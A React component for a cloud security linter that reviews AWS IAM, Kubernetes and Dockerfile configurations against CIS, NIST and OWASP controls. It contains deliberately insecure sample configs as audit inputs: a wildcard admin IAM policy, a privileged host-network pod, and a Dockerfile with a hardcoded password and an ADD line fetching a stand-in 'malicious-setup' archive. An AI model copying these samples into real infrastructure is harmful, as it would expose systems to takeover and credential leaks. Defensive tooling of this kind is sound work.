import React, { useState } from 'react';
import { 
  ShieldCheck, 
  Play, 
  FileCheck, 
  AlertTriangle, 
  CheckCircle, 
  Layers, 
  Copy, 
  Check,
  Terminal,
  Cloud,
  Box
} from 'lucide-react';
import SeverityBadge from '../common/SeverityBadge';
import { api } from '../../services/api';

const SAMPLES = {
  iam: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "OverlyPermissiveAdmin",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    },
    {
      "Sid": "PublicAssumeRole",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "sts:AssumeRole"
    }
  ]
}`,
  k8s: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-processor
spec:
  replicas: 3
  template:
    spec:
      hostNetwork: true
      containers:
      - name: payment-api
        image: payment-api:latest
        securityContext:
          privileged: true
          runAsNonRoot: false
`,
  dockerfile: `FROM node:latest

ENV DB_PASSWORD=production_supersecret_pass_123

EXPOSE 22
EXPOSE 3000

ADD https://example.com/malicious-setup.tar.gz /tmp/

CMD ["node", "server.js"]
`
};

export default function ArchitectureReviewerView() {
  const [configType, setConfigType] = useState('iam'); // iam, k8s, dockerfile
  const [content, setContent] = useState(SAMPLES.iam);
  const [reviewResult, setReviewResult] = useState(null);
  const [isReviewing, setIsReviewing] = useState(false);
  const [copiedId, setCopiedId] = useState(null);

  const handleSelectType = (type) => {
    setConfigType(type);
    setContent(SAMPLES[type]);
    setReviewResult(null);
  };

  const handleRunReview = async () => {
    setIsReviewing(true);
    try {
      const res = await api.reviewArchitecture(configType, content, `CloudConfig-${configType.toUpperCase()}`);
      setReviewResult(res);
    } catch (err) {
      alert(`Review error: ${err.message}`);
    } finally {
      setIsReviewing(false);
    }
  };

  const handleCopySnippet = (snippet, id) => {
    navigator.clipboard.writeText(snippet);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-5 rounded-xl soc-panel border-cyan-500/20">
        <div>
          <h1 className="text-xl font-bold text-slate-100 flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-cyan-400" />
            Security Architecture Reviewer & Cloud Linter
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            Automated compliance auditor mapped against CIS Benchmarks, NIST SP 800-53 Rev 5, and OWASP Top 10.
          </p>
        </div>

        {/* Format Selector Tabs */}
        <div className="flex rounded-lg bg-slate-900/80 p-1 border border-soc-border">
          <button
            onClick={() => handleSelectType('iam')}
            className={`px-3 py-1.5 text-xs font-medium rounded-md transition-all flex items-center gap-1.5 ${
              configType === 'iam' ? 'bg-cyan-500 text-slate-950 font-semibold' : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Cloud className="w-3.5 h-3.5" />
            AWS IAM JSON
          </button>
          <button
            onClick={() => handleSelectType('k8s')}
            className={`px-3 py-1.5 text-xs font-medium rounded-md transition-all flex items-center gap-1.5 ${
              configType === 'k8s' ? 'bg-cyan-500 text-slate-950 font-semibold' : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            Kubernetes YAML
          </button>
          <button
            onClick={() => handleSelectType('dockerfile')}
            className={`px-3 py-1.5 text-xs font-medium rounded-md transition-all flex items-center gap-1.5 ${
              configType === 'dockerfile' ? 'bg-cyan-500 text-slate-950 font-semibold' : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Box className="w-3.5 h-3.5" />
            Dockerfile
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Editor Column */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-4 rounded-xl soc-panel space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-slate-300">
                Configuration Spec ({configType.toUpperCase()})
              </span>
              <button
                onClick={() => setContent(SAMPLES[configType])}
                className="text-[11px] text-cyan-400 hover:underline"
              >
                Reset Insecure Sample
              </button>
            </div>

            <textarea
              value={content}
              onChange={(e) => setContent(e.target.value)}
              rows={18}
              className="w-full font-mono text-xs bg-slate-950/80 border border-soc-border rounded-lg p-3 text-cyan-100/90 focus:outline-none focus:border-cyan-500/60 leading-relaxed resize-none"
            />

            <button
              onClick={handleRunReview}
              disabled={isReviewing}
              className="w-full py-2.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs transition-all flex items-center justify-center gap-2 shadow-lg shadow-cyan-500/20 disabled:opacity-50"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              {isReviewing ? 'Auditing against CIS/NIST...' : 'Review Architecture'}
            </button>
          </div>
        </div>

        {/* Results & Playbooks Column */}
        <div className="lg:col-span-7 space-y-4">
          {reviewResult ? (
            <div className="space-y-4">
              {/* Compliance Score Gauge Banner */}
              <div className="p-4 rounded-xl soc-panel flex items-center justify-between">
                <div>
                  <span className="text-xs text-slate-400">Architecture Hardening Score</span>
                  <div className="flex items-baseline gap-2 mt-1">
                    <span className="text-3xl font-extrabold font-mono text-cyan-400">
                      {reviewResult.compliance_score}%
                    </span>
                    <span className="text-xs text-slate-400">
                      ({reviewResult.passed_checks} / {reviewResult.total_checks} Checks Passed)
                    </span>
                  </div>
                </div>
                <div className="flex gap-2">
                  <div className="px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono">
                    PASS: {reviewResult.passed_checks}
                  </div>
                  <div className="px-3 py-1.5 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs font-mono">
                    FAIL: {reviewResult.failed_checks}
                  </div>
                </div>
              </div>

              {/* Findings & Remediation Playbooks */}
              <div className="space-y-3 max-h-[540px] overflow-y-auto pr-1">
                {reviewResult.findings.map((f) => (
                  <div
                    key={f.check_id}
                    className={`p-4 rounded-xl soc-card space-y-3 border-l-4 ${
                      f.passed ? 'border-l-emerald-500 bg-emerald-950/10' : 'border-l-rose-500 bg-rose-950/10'
                    }`}
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div>
                        <div className="flex items-center gap-2">
                          <SeverityBadge severity={f.passed ? 'Passed' : f.severity} size="sm" />
                          <h4 className="text-xs font-bold text-slate-100">
                            {f.title}
                          </h4>
                        </div>
                        <div className="flex flex-wrap gap-2 text-[10px] text-cyan-400/90 font-mono mt-1">
                          <span>{f.cis_benchmark}</span>
                          <span>· {f.nist_control}</span>
                          <span>· {f.owasp_mapping}</span>
                        </div>
                      </div>
                      <span className={`text-xs font-bold font-mono px-2 py-0.5 rounded ${
                        f.passed ? 'text-emerald-400 bg-emerald-500/20' : 'text-rose-400 bg-rose-500/20'
                      }`}>
                        {f.passed ? 'COMPLIANT' : 'VIOLATION'}
                      </span>
                    </div>

                    <p className="text-xs text-slate-300">
                      {f.description}
                    </p>

                    {!f.passed && (
                      <div className="p-3 rounded-lg bg-slate-950/90 border border-slate-800 space-y-2">
                        <div className="flex items-center justify-between text-[11px] text-cyan-400 font-semibold">
                          <span>Actionable Remediation Playbook:</span>
                          {f.fixed_snippet && (
                            <button
                              onClick={() => handleCopySnippet(f.fixed_snippet, f.check_id)}
                              className="text-[10px] text-slate-400 hover:text-slate-200 flex items-center gap-1"
                            >
                              {copiedId === f.check_id ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                              Copy Fix
                            </button>
                          )}
                        </div>
                        <p className="text-[11px] text-slate-300">
                          {f.remediation_playbook}
                        </p>
                        {f.fixed_snippet && (
                          <pre className="p-2 rounded bg-slate-900 font-mono text-[10px] text-emerald-300 border border-emerald-950 overflow-x-auto">
                            {f.fixed_snippet}
                          </pre>
                        )}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="h-full flex flex-col items-center justify-center p-12 text-center soc-panel rounded-xl text-slate-500 min-h-[380px]">
              <ShieldCheck className="w-10 h-10 mb-3 text-slate-600" />
              <h3 className="text-sm font-semibold text-slate-300">Audit Ready</h3>
              <p className="text-xs max-w-sm mt-1">
                Click 'Review Architecture' to test against CIS Benchmarks, NIST SP 800-53, and OWASP Top 10.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
